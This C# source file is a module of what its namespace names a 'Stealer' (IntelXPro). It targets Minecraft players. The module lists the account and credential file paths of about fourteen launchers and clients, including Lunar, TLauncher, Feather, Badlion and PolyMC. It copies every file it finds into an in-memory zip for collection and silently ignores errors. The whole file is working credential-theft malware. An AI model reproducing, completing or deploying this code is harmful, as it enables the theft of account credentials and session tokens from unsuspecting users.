using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications.Games
{
    internal class MinecraftLauncher : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
            Dictionary<string, string> dictionary = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
            dictionary.Add("Intent", Path.Combine(environmentVariable, "intentlauncher", "launcherconfig"));
            dictionary.Add("Lunar", Path.Combine(environmentVariable, ".lunarclient", "settings", "game", "accounts.json"));
            dictionary.Add("TLauncher", Path.Combine(folderPath, ".minecraft", "TlauncherProfiles.json"));
            dictionary.Add("Feather", Path.Combine(folderPath, ".feather", "accounts.json"));
            dictionary.Add("Meteor", Path.Combine(folderPath, ".minecraft", "meteor-client", "accounts.nbt"));
            dictionary.Add("Impact", Path.Combine(folderPath, ".minecraft", "Impact", "alts.json"));
            dictionary.Add("Novoline", Path.Combine(folderPath, ".minecraft", "Novoline", "alts.novo"));
            dictionary.Add("CheatBreakers", Path.Combine(folderPath, ".minecraft", "cheatbreaker_accounts.json"));
            dictionary.Add("Microsoft Store", Path.Combine(folderPath, ".minecraft", "launcher_accounts_microsoft_store.json"));
            dictionary.Add("Rise", Path.Combine(folderPath, ".minecraft", "Rise", "alts.txt"));
            dictionary.Add("Rise (Intent)", Path.Combine(environmentVariable, "intentlauncher", "Rise", "alts.txt"));
            dictionary.Add("Paladium", Path.Combine(folderPath, "paladium-group", "accounts.json"));
            dictionary.Add("PolyMC", Path.Combine(folderPath, "PolyMC", "accounts.json"));
            dictionary.Add("Badlion", Path.Combine(folderPath, "Badlion Client", "accounts.json"));
            Counter.CounterApplications counterApplications = new Counter.CounterApplications
            {
                Name = "Minecraft"
            };
            foreach (KeyValuePair<string, string> item in dictionary)
            {
                if (File.Exists(item.Value))
                {
                    try
                    {
                        string path = Path.Combine("Minecraft", item.Key);
                        string fileName = Path.GetFileName(item.Value);
                        string text = Path.Combine(path, fileName);
                        zip.AddFile(text, File.ReadAllBytes(item.Value));
                        counterApplications.Files.Add(item.Value + " => " + text);
                    }
                    catch
                    {
                    }
                }
            }
            if (counterApplications.Files.Count > 0)
            {
                counterApplications.Files.Add("Minecraft\\");
                counter.Games.Add(counterApplications);
            }
        }
    }
}
